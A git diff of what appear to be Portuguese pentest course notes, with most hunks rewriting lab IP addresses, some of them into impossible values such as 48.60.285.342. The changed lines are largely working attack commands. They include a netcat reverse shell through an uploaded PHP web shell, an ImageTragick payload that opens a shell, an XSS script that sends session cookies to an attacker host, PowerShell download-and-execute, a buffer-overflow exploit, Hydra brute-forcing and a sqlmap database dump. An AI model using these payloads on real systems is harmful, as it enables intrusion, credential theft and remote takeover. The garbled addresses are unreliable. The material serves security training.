@@ -808,7 +808,7 @@ Verificando vulnerabilidade de transferência de zona no DNS com o comando
 
 Descoberta de HOST por Brute Force
 
-    for ip in $(seq 220 239);do host 37.59.174.$ip;done
+    for ip in $(seq 220 239);do host 48.60.285.$ip;done
 
 Descoberta de Domínios por IP
 
@@ -1610,7 +1610,7 @@ Acessa com o nível de administrador
 
 Altera a info de contact do serviço snmp do servidor.
 
-    sudo hydra -P /usr/share/wordlists/metasploit/snmp_default_pass.txt 172.30.0.103 snmp
+    sudo hydra -P /usr/share/wordlists/metasploit/snmp_default_pass.txt 192.200.0.103 snmp
 
 Bruteforce de community do snmp
 
@@ -1694,7 +1694,7 @@ Executa argumentos para validação da vulnerabilidade
 
 Procurando por vulnerabilidade de FTP com usuário anônimo
 
-    /user/share/nmap/scripts# nmap -p80 --script http-shellshock --script-args uri=/sgi-bin/test.cgi,cmd=ls 172.30.0.108
+    /user/share/nmap/scripts# nmap -p80 --script http-shellshock --script-args uri=/sgi-bin/test.cgi,cmd=ls 192.200.0.108
 
 Executando o script com argumentos após a varredura do host e descobrir o caminho test.cgi
 
@@ -3469,7 +3469,7 @@ Dá um dump nas infos gravadas no EIP
 
 .
 
-    nc 172.30.0.10 8888 
+    nc 192.200.0.10 8888 
 
 Sistema vulnerável para ganhar acesso com buffer overflow (./desafio)
 
@@ -3527,7 +3527,7 @@ Roda o comando com buffer de 136chars + EIP e o endereço de exploração que ch
 
 Continua com o programa rodando depois do breakpoint
 
-    python2 -c 'print "A" * 136 + "\x0c\x84\x04\x08" ' | nc 172.30.0.10 8888  
+    python2 -c 'print "A" * 136 + "\x0c\x84\x04\x08" ' | nc 192.200.0.10 8888  
 
 Exploit já criado pronto para ser executado no servidor que se encontra o programa.
 
@@ -3834,11 +3834,11 @@ Para acesso ao log injetar via nc -v 192.168.1.10 80 -C a shell <?php system(\$_
 
 Opções de testes de leitura de arquivo: /var/log/auth.log /var/log/mail.log /var/spool/mail/www-data&kid=ls -la
 
-	telnet 172.30.0.128 25                                      
+	telnet 192.200.0.128 25                                      
 
-	Trying 172.30.0.128...
+	Trying 192.200.0.128...
 
-	Connected to 172.30.0.128.
+	Connected to 192.200.0.128.
 
 	Escape character is '^]'.
 
@@ -3916,7 +3916,7 @@ Consiste em armazenar código JS em banco de dados, através de um campo de form
 
 Ao identificar este campo, pode-se abrir um serviço http via python e enviar uma requisição JS para esta máquina com o PHPSESSID (Cookie) através do script: 
 
-    no server: 192.168.1.250 <script>new Image().src="http://172.20.1.120:8080/?="+document.cookie;</script> 
+    no server: 192.168.1.250 <script>new Image().src="http://192.200.1.120:8080/?="+document.cookie;</script> 
 
 Esse script envia dados para o serviço aberto na máquina do atacante. Na máquina atacante vai chegar o cookie da sessão da máquina vítima, depois adiciona o cookie `<script>alert(document.cookie="COOKIECAPT")</script>`
 
@@ -4159,7 +4159,7 @@ Realizando ataques de força bruta HYDRA
 
     hydra -v -L users.txt -P pass.txt 192.168.1.10 http-post-ou-get-form "/turismo/login.php:login=^USER^&senha=^PASS^&Login:incorreto"
 
-    hydra -s 80 -L users.txt -P /usr/share/wordlists/rockyou.txt 172.16.0.2 http-post-form "/app/index.pl:Action=Login&RequestedURL=&Lang=en&TimeOffset=180&User=^USER^&Password=^PASS^&submit:MSG-FALHA" -I
+    hydra -s 80 -L users.txt -P /usr/share/wordlists/rockyou.txt 192.168.0.2 http-post-form "/app/index.pl:Action=Login&RequestedURL=&Lang=en&TimeOffset=180&User=^USER^&Password=^PASS^&submit:MSG-FALHA" -I
 
     hydra -l <username> -P <wordlist> MACHINE_IP http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
 
@@ -4177,21 +4177,21 @@ Quando houver um redirecionamento forçando o navegador ir para a página corret
 
 - File Disclosure - LFI
 
-Acessar arquivos e fazer downloads do código fonte de páginas. Geralmente campos de upload, download e redirecionamento. Olhar o cookie e tentar decifrar e pedir outro arquivo, quando sem ideia, pode pedir o próprio arquivo de download.  No Host 172.30.0.20/sistema - troca o cookie para true e faz um download do conecta.php pegando os dados do mysql para acessar o banco, pegar a senha e acessar o ssh.
+Acessar arquivos e fazer downloads do código fonte de páginas. Geralmente campos de upload, download e redirecionamento. Olhar o cookie e tentar decifrar e pedir outro arquivo, quando sem ideia, pode pedir o próprio arquivo de download.  No Host 192.200.0.20/sistema - troca o cookie para true e faz um download do conecta.php pegando os dados do mysql para acessar o banco, pegar a senha e acessar o ssh.
 
 - Explorando inputs de Uploads
 
 Identificar na aplicação campo de upload de arquivos. 
 
-    172.30.40/_old/
+    192.200.40/_old/
 
 Fazer o upload de arquivo com a extensão da aplicação .php .aspx <?php system($_POST['hack'])?>
 
-    curl http://172.30.0.40/_old/upload/kidman.php -d "hack=id" 
+    curl http://192.200.0.40/_old/upload/kidman.php -d "hack=id" 
 
 Pegando o ID da máquina alvo
 
-    curl http://172.30.0.40/_old/upload/kidman.php -d "hack=/bin/nc 192.168.2.10 4455 -e /bin/bash/"
+    curl http://192.200.0.40/_old/upload/kidman.php -d "hack=/bin/nc 192.168.2.10 4455 -e /bin/bash/"
 
 Para pegar a shell verificar se tem o netcat funcionando e abrir uma shell 
 
@@ -4210,11 +4210,11 @@ Quando a aplicação trava o envio de uma extensão diferente da que ele permite
 
 - Bypass de Upload de Imagens
 
-Tentar as técnicas aprendidas acima, como alterar o head para `GIF89a` ou a extensão para `.gif` e buscar novas alternativas. Por exemplo, pesquisar por exploites de imagens para realizar testes. 172.30.0.130/uploads. ImageTragic.com CVE-2016-3714. Pegar o exploit.jpg  
+Tentar as técnicas aprendidas acima, como alterar o head para `GIF89a` ou a extensão para `.gif` e buscar novas alternativas. Por exemplo, pesquisar por exploites de imagens para realizar testes. 192.200.0.130/uploads. ImageTragic.com CVE-2016-3714. Pegar o exploit.jpg  
 
 	push graphic-context
 		    viewbox 0 0 640 480
-		    fill 'url(https:/";nc -e /bin/bash 172.20.1.86 443")'
+		    fill 'url(https:/";nc -e /bin/bash 192.200.1.86 443")'
 		    pop graphic-context
 
 e ver o comportamento da aplicação. Se positivo, pode se testar um wget na máquina do atacante ou ping ou nc reverso como no exemplo.
@@ -4246,26 +4246,26 @@ OU passando diretamente o código se a aplicação aceitar index.php?page=data:/
 
 Aplicação de código aberto onde tem vários exploits públicos e várias vulnerabilidades principalmente de sql injection. Depois de fazer o mapeamento do código publico e fazer a enumeração da aplicação, verificar por ferramentas feitas especialmente para a aplicação: joomscan
 
-    joomscan -u http://172.30.0.106/ 
+    joomscan -u http://192.200.0.106/ 
 
 Enumera toda a aplicação buscando por vulns 44033 CVE-2017-8917 https://www.exploit-db.com/exploits/42033
 
 
-    sqlmap -u "http://172.30.0.106/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering] 
+    sqlmap -u "http://192.200.0.106/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering] 
 
 Vai trazer as tabelas
 
 
-    sqlmap -u "http://172.30.0.106/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D medica --tables -p list[fullordering]
+    sqlmap -u "http://192.200.0.106/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D medica --tables -p list[fullordering]
 
-    sqlmap -u "http://172.30.0.106/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D medica -T info --columns -p list[fullordering]
+    sqlmap -u "http://192.200.0.106/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D medica -T info --columns -p list[fullordering]
 
-    sqlmap -u "http://172.30.0.106/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D medica -T info -C flag --dump -p list[fullordering]
+    sqlmap -u "http://192.200.0.106/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D medica -T info -C flag --dump -p list[fullordering]
 
 
 - Explorando o PHPMailer
 
-Consiste basicamente em explorar vulnerabilidades da aplicação onde há campos de envio de mensagens como de comentários ou formulários de solicitação de contato, por isso o mailer, fazendo uso de exploits do exploit-db.com/exploits/40969 adaptando para uso do ambiente de teste atual assim como também o diretório onde será salvo o arquivo gerado pelo exploit. Alterar os parâmetros do campo do formulário e preencher todos para não dar erro de envio. Deve descobrir um local para upload de arquivos e que possa clicar para executar o arquivo e validar o código enviado. Se não funcionar alterar entre os payloads disponíveis. Além de opcionalmente enviar uma shell para a aplicação usando o `$_GET` ou o `NC`. Host 172.30.0.125
+Consiste basicamente em explorar vulnerabilidades da aplicação onde há campos de envio de mensagens como de comentários ou formulários de solicitação de contato, por isso o mailer, fazendo uso de exploits do exploit-db.com/exploits/40969 adaptando para uso do ambiente de teste atual assim como também o diretório onde será salvo o arquivo gerado pelo exploit. Alterar os parâmetros do campo do formulário e preencher todos para não dar erro de envio. Deve descobrir um local para upload de arquivos e que possa clicar para executar o arquivo e validar o código enviado. Se não funcionar alterar entre os payloads disponíveis. Além de opcionalmente enviar uma shell para a aplicação usando o `$_GET` ou o `NC`. Host 192.200.0.125
 
 - Construindo o Mindset Hacking
 
@@ -4374,20 +4374,20 @@ Subindo uma página local na porta informada usando python ou
 
 Se conectando à ele (WINDOWS):
 
-        1 - certutil.exe -urlcache -f http://172.20.1.6/file.exe file.exe Faz Download do arquivo
+        1 - certutil.exe -urlcache -f http://192.200.1.6/file.exe file.exe Faz Download do arquivo
 
-        2 - poweshell.exe wget http://172.20.1.6/file -OutFile file.exe Faz Download do arquivo
+        2 - poweshell.exe wget http://192.200.1.6/file -OutFile file.exe Faz Download do arquivo
 
-        3 - powershel.exe (New-Object  System.Net.WebClient).DownloadFile('http://172.20.1.6/file.exe','file.exe') Faz Download
+        3 - powershel.exe (New-Object  System.Net.WebClient).DownloadFile('http://192.200.1.6/file.exe','file.exe') Faz Download
 
-        4 - powershel.exe IEX(New-Object System.Net.WebClient).DownloadString('http://172.20.1.6/file.exe','file.exe') Faz down e executa
+        4 - powershel.exe IEX(New-Object System.Net.WebClient).DownloadString('http://192.200.1.6/file.exe','file.exe') Faz down e executa
 
 
 Se conectando à ele (LINUX):
 
-        wget http://172.20.1.6/file.exe -O /tmp/file.exe
+        wget http://192.200.1.6/file.exe -O /tmp/file.exe
 
-        curl http://172.20.1.6/file.exe -o file.exe
+        curl http://192.200.1.6/file.exe -o file.exe
 
 
 - Transferência de arquivos: FTP
@@ -4783,7 +4783,7 @@ Se o arquivo tem permissão 777 editar e colocar o código..
     nc -e /bin/bash Ip-do-Atacante Porta
 
 
-Desafio: Invadir os hosts 172.30.0.15,20,30,40 e pegar o acesso ao host coreserver
+Desafio: Invadir os hosts 192.200.0.15,20,30,40 e pegar o acesso ao host coreserver
 
 - Linux PrivEsc: Kernel
 
@@ -4799,7 +4799,7 @@ Com o arquivo em mãos
 
         ./arquivo 
 
-E passará a ter acesso root ao sistema. 37.59.174.231/blog
+E passará a ter acesso root ao sistema. 48.60.285.342/blog
 
     wget https://link.aqui.com -no-check-certificate 
 
@@ -5059,7 +5059,7 @@ https://w0lfram1te.com/privilege-escalation-with-nmap
     nmap> !sh
     cat /etc/passwd e shadow
 
-Captura as hashes e encontra a senha para o host 172.20.10.8 homologacao
+Captura as hashes e encontra a senha para o host 192.200.10.8 homologacao
 
 192.200.10.8
 
@@ -5218,7 +5218,7 @@ Redirecionamento de portas `8088` local da 80 remota OU
 add regra no firewall: `any` de fora para `NAT 192.16.1.10` na  porta dest `2221`. 
 Irá no IP do firewall liberar a porta 443 apontando para o IP interno 192.168.1.10 na mesma porta
 
-Faz upload de uma `shell.asp` no msfvenom para o ftp pasta da web e chama com um `multi/handler` escutando. E pega o meterpreter do host 172.30.10.101 que é o server interno do firewall que foi criado a regra.
+Faz upload de uma `shell.asp` no msfvenom para o ftp pasta da web e chama com um `multi/handler` escutando. E pega o meterpreter do host 192.200.10.101 que é o server interno do firewall que foi criado a regra.
 
 
 - Company 9
